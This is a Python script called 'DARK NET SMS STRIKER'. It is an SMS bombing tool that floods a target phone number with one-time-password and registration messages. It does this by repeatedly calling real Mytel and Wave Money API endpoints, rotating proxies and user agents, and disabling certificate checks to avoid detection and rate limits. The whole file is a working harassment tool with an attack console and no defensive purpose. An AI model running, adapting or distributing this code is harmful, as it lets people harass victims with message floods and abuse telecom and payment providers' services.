import os
import time
import json
import random
import threading
import requests
import urllib3
from rich.console import Console
from rich.panel import Panel
from rich.live import Live
from rich.layout import Layout
from rich.align import Align


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

class SMS_Striker:
    def __init__(self):
        self.success = 0
        self.failed = 0
        self.is_running = False
        self.logs = []
        self.target_phone = ""
        self.working_apis = []  # Store working APIs only
        self.api_tested = False  # Flag to check if we have tested APIs
        self.all_apis = []  # Store all APIs for initial testing

        
        try:
            with open('useragent.json', 'r') as f:
                data = json.load(f)
                self.ua_list = data["user_agent"]
        except:
            self.ua_list = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)"]
        
        # Initialize all APIs
        self.init_apis()

    def init_apis(self):
        """Initialize all available APIs"""
        self.all_apis = [
            {"n": "Mytel-G", "u": f"https://apis.mytel.com.mm/myid/authen/v1.0/login/method/otp/get-otp?phoneNumber={self.target_phone}", "m": "GET"},
            {"n": "Mytel-P", "u": "https://apis.mytel.com.mm/api/3party/otp_service/sendOTPForPortal", "m": "POST", "d": {"msisdn": self.target_phone, "serviceType": "PORTAL"}},
            {"n": "Wave-R", "u": "https://api.wavemoney.io:8100/wmt-mfs-otp/v3/wmt-mfs-otp/register-customer", "m": "POST", "d": {"msisdn": self.target_phone, "device_id": f"kmh-{random.getrandbits(24)}", "language": "my"}},
            {"n": "Mytel-V", "u": "https://apis.mytel.com.mm/myid/authen/v1.0/v2/register/request", "m": "POST", "d": {"phoneNumber": self.target_phone}}
        ]

    def format_phone(self, phone):
        """Format phone number to required format"""
        phone = phone.strip().replace("+", "")
        if phone.startswith("09"):
            return "959" + phone[2:]
        return phone

    def get_proxy(self):
        """Get random proxy from file"""
        try:
            if os.path.exists("proxies.txt") and os.path.getsize("proxies.txt") > 0:
                with open("proxies.txt", "r") as f:
                    proxies = f.read().splitlines()
                return {"http": "http://" + random.choice(proxies)}
            return None
        except: 
            return None

    def test_api(self, api):
        """Test if an API works for the current target"""
        headers = {"User-Agent": random.choice(self.ua_list), "Content-Type": "application/json"}
        
        try:
            if api["m"] == "GET":
                r = requests.get(api["u"], headers=headers, proxies=self.get_proxy(), timeout=10)
            else:
                r = requests.post(api["u"], json=api["d"], headers=headers, proxies=self.get_proxy(), verify=False, timeout=10)
            
            if r.status_code in [200, 201]:
                return True
            return False
        except:
            return False

    def test_all_apis(self):
        """Test all APIs once to find working ones"""
        self.logs.append("[bold yellow]🔍 Testing APIs for target...[/bold yellow]")
        
        for api in self.all_apis:
            # Update the URL with current phone number for each test
            api_copy = api.copy()
            if "u" in api_copy:
                if "?" in api_copy["u"]:
                    api_copy["u"] = api_copy["u"].split("?")[0] + f"?phoneNumber={self.target_phone}"
                else:
                    api_copy["u"] = api_copy["u"]
            
            # For POST APIs, update the data with current phone number
            if "d" in api_copy:
                for key in api_copy["d"]:
                    if "phone" in key.lower() or "msisdn" in key.lower():
                        api_copy["d"][key] = self.target_phone
                if api_copy["n"] == "Wave-R":
                    api_copy["d"]["device_id"] = f"kmh-{random.getrandbits(24)}"
            
            self.logs.append(f"[yellow]Testing {api_copy['n']}...[/yellow]")
            
            if self.test_api(api_copy):
                self.working_apis.append(api_copy)
                self.logs.append(f"[bold green]✓ {api_copy['n']} is WORKING![/bold green]")
            else:
                self.logs.append(f"[bold red]✗ {api_copy['n']} is FAILED[/bold red]")
            
            time.sleep(1)  # Small delay between tests
        
        if len(self.working_apis) == 0:
            self.logs.append("[bold red]❌ No working APIs found! Exiting...[/bold red]")
            return False
        
        self.logs.append(f"[bold green]✅ Found {len(self.working_apis)} working APIs[/bold green]")
        return True

    def send_sms(self, api):
        """Send SMS using a specific API"""
        headers = {"User-Agent": random.choice(self.ua_list), "Content-Type": "application/json"}
        
        # Update the API with current phone number and random data
        api_copy = api.copy()
        if "d" in api_copy:
            for key in api_copy["d"]:
                if "phone" in key.lower() or "msisdn" in key.lower():
                    api_copy["d"][key] = self.target_phone
            if api_copy["n"] == "Wave-R":
                api_copy["d"]["device_id"] = f"kmh-{random.getrandbits(24)}"
        
        try:
            if api_copy["m"] == "GET":
                r = requests.get(api_copy["u"], headers=headers, proxies=self.get_proxy(), timeout=7)
            else:
                r = requests.post(api_copy["u"], json=api_copy["d"], headers=headers, proxies=self.get_proxy(), verify=False, timeout=7)
            
            if r.status_code in [200, 201]:
                return True, api_copy["n"]
            return False, api_copy["n"]
        except:
            return False, api_copy["n"]

    def attack(self, phone, amount):
        self.target_phone = self.format_phone(phone)
        
        # Update all APIs with the target phone number
        self.init_apis()
        
        # First, test all APIs to find working ones
        self.api_tested = True
        if not self.test_all_apis():
            self.is_running = False
            return
        
        count = 0
        
        while self.is_running and count < amount:
            if len(self.working_apis) == 0:
                self.logs.append("[bold red]❌ No working APIs available![/bold red]")
                break
            
            # Choose random working API
            api = random.choice(self.working_apis)
            success, api_name = self.send_sms(api)
            
            if success:
                self.success += 1
                self.logs.append(f"[bold green]▶ {api_name} -> SUCCESS[/bold green]")
            else:
                self.failed += 1
                self.logs.append(f"[bold red]▶ {api_name} -> FAILED[/bold red]")
                # If API fails during attack, we could optionally re-test it
                # But we'll keep it for now since it might work again later
            
            count += 1
            if len(self.logs) > 12: 
                self.logs.pop(0)
            
            # Random delay between 0.5 to 1.5 seconds
            time.sleep(random.uniform(0.5, 1.5))
        
        self.is_running = False

    def get_logo(self):
        logo = """
[bold red]  _____             _      _   _      _
 |  __ \           | |    | \ | |    | |
 | |  | | __ _ _ __| | __ |  \| | ___| |_
 | |  | |/ _` | '__| |/ / | . ` |/ _ \ __|
 | |__| | (_| | |  |   <  | |\  |  __/ |_
 |_____/ \__,_|_|  |_|\_\ |_| \_|\___|\__|[/bold red]
        [bold white]DARK NET SMS STRIKER v8.0 (Smart Mode)[/bold white]
        """
        return Align.center(logo)

    def make_layout(self, amount):
        layout = Layout()
        layout.split_column(
            Layout(Panel(self.get_logo(), border_style="red"), size=10),
            Layout(name="body")
        )

        info = f"[bold cyan]🎯 Target  :[/bold cyan] {self.target_phone}\n"
        info += f"[bold cyan]🔢 Amount  :[/bold cyan] {amount}\n"
        info += f"[bold green]✅ Success :[/bold green] {self.success}\n"
        info += f"[bold red]❌ Failed  :[/bold red] {self.failed}\n"
        
        if self.api_tested:
            info += f"[bold magenta]⚙️ Working APIs: {len(self.working_apis)}[/bold magenta]\n"
        else:
            info += f"[bold yellow]⚙️ Status: Testing APIs...[/bold yellow]\n"
        
        info += f"\n[bold yellow]👤 Creator :[/bold yellow] K.M.H 😎\n"
        info += f"[bold yellow]📡 Status  :[/bold yellow] [blink]STRIKING...[/blink]"

        layout["body"].split_row(
            Layout(Panel(info, title="[bold white]System Info[/bold white]", border_style="blue")),
            Layout(Panel("\n".join(self.logs[-12:]), title="[bold white]Attack Logs[/bold white]", border_style="red"))
        )
        return layout

def main():
    os.system('clear')
    app = SMS_Striker()

    console.print(Panel(Align.center("[bold red]☣️ SYSTEM BREACH INITIATED ☣️[/bold red]\n[white]Created by K.M.H[/white]"), border_style="red"))

    phone = console.input("[bold yellow]Enter Target (09/959): [/bold yellow]")
    try:
        amount = int(console.input("[bold yellow]Enter Amount: [/bold yellow]"))
    except:
        amount = 50

    app.is_running = True
    threading.Thread(target=app.attack, args=(phone, amount), daemon=True).start()

    with Live(app.make_layout(amount), refresh_per_second=4) as live:
        while app.is_running:
            live.update(app.make_layout(amount))
            time.sleep(0.5)

    console.print(f"\n[bold green]✅ STRIKE COMPLETED! TOTAL INJECTED: {app.success}[/bold green]")

if __name__ == "__main__":
    main()